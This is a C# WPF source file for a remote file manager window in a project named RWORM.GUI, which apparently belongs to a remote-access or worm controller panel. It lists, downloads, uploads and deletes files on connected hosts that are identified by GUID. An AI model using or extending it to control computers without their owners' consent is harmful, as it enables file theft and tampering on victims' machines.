using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using Microsoft.Win32;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public record FileEntry(string Name, string Type, long Size, string Modified)
    {
        public string Icon    => Type == "dir" ? "📁" : "📄";
        public string SizeStr => Type == "dir" ? "<DIR>" : FormatSize(Size);
        private static string FormatSize(long b) =>
            b >= 1024 * 1024 ? $"{b / (1024 * 1024):N1} MB" :
            b >= 1024        ? $"{b / 1024:N0} KB" : $"{b} B";
    }

    public partial class FileManagerWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private readonly Stack<string>    _history = new();
        private string                    _currentPath = @"C:\";

        public FileManagerWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            TitleLabel.Text = $"Files — {hostname}";
            Navigate(@"C:\");
        }

        // ── Navigation ─────────────────────────────────────────────────────────
        private void Navigate(string path)
        {
            _history.Push(_currentPath);
            _currentPath = path;
            PathBox.Text  = path;
            StatusLabel.Text = "Loading...";
            _server.RequestFileListAsync(_guid, path, OnFileList);
        }

        private void OnFileList(byte[] data)
        {
            try
            {
                var items = JsonSerializer.Deserialize<List<JsonElement>>(data);
                if (items == null) return;

                var entries = items.Select(e =>
                {
                    e.TryGetProperty("error", out var err);
                    if (err.ValueKind == JsonValueKind.String)
                        return new FileEntry(err.GetString() ?? "", "error", 0, "");

                    return new FileEntry(
                        e.GetProperty("name").GetString() ?? "",
                        e.GetProperty("type").GetString() ?? "file",
                        e.TryGetProperty("size", out var sz) ? sz.GetInt64() : 0,
                        e.TryGetProperty("modified", out var m) ? m.GetString() ?? "" : ""
                    );
                })
                .OrderByDescending(f => f.Type == "dir")
                .ThenBy(f => f.Name)
                .ToList();

                Dispatcher.Invoke(() =>
                {
                    FileGrid.ItemsSource = entries;
                    StatusLabel.Text = $"{entries.Count} items — {_currentPath}";
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => StatusLabel.Text = $"Error: {ex.Message}");
            }
        }

        // ── Double-click: enter directory ──────────────────────────────────────
        private void FileGrid_DoubleClick(object s, MouseButtonEventArgs e)
        {
            if (FileGrid.SelectedItem is not FileEntry f) return;
            if (f.Type == "dir")
                Navigate(Path.Combine(_currentPath, f.Name));
        }

        private void Back_Click(object s, RoutedEventArgs e)
        {
            if (_history.Count > 1) { _history.Pop(); Navigate(_history.Pop()); }
            else Navigate(Path.GetDirectoryName(_currentPath) ?? _currentPath);
        }

        private void PathBox_KeyDown(object s, KeyEventArgs e)
        {
            if (e.Key == Key.Enter) Navigate(PathBox.Text.Trim());
        }

        // ── File operations ────────────────────────────────────────────────────
        private void Download_Click(object s, RoutedEventArgs e)
        {
            if (FileGrid.SelectedItem is not FileEntry f || f.Type == "dir") return;
            var dlg = new SaveFileDialog { FileName = f.Name };
            if (dlg.ShowDialog() != true) return;
            StatusLabel.Text = "Downloading...";
            _server.DownloadFileAsync(_guid, Path.Combine(_currentPath, f.Name), data =>
            {
                Dispatcher.Invoke(() =>
                {
                    if (data.Length > 0 && data[0] == '{')
                    {
                        StatusLabel.Text = "Download error: " + System.Text.Encoding.UTF8.GetString(data);
                        return;
                    }
                    File.WriteAllBytes(dlg.FileName, data);
                    StatusLabel.Text = $"Saved → {dlg.FileName}";
                });
            });
        }

        private void Upload_Click(object s, RoutedEventArgs e)
        {
            var dlg = new OpenFileDialog { Title = "Select file to upload" };
            if (dlg.ShowDialog() != true) return;
            var data     = File.ReadAllBytes(dlg.FileName);
            var remotePath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
            _ = _server.UploadFileAsync(_guid, remotePath, data);
            StatusLabel.Text = $"Uploading {Path.GetFileName(dlg.FileName)}...";
        }

        private void Delete_Click(object s, RoutedEventArgs e)
        {
            if (FileGrid.SelectedItem is not FileEntry f) return;
            if (MessageBox.Show($"Delete {f.Name}?", "Confirm",
                    MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
            _ = _server.DeleteRemotePathAsync(_guid, Path.Combine(_currentPath, f.Name));
            StatusLabel.Text = $"Deleted {f.Name}";
            Navigate(_currentPath);
        }

        private void NewFolder_Click(object s, RoutedEventArgs e)
        {
            var name = InputDialog.Show("Folder name:", "New Folder", "NewFolder");
            if (string.IsNullOrWhiteSpace(name)) return;
            _ = _server.MakeDirAsync(_guid, Path.Combine(_currentPath, name));
            Navigate(_currentPath);
        }

    }
}
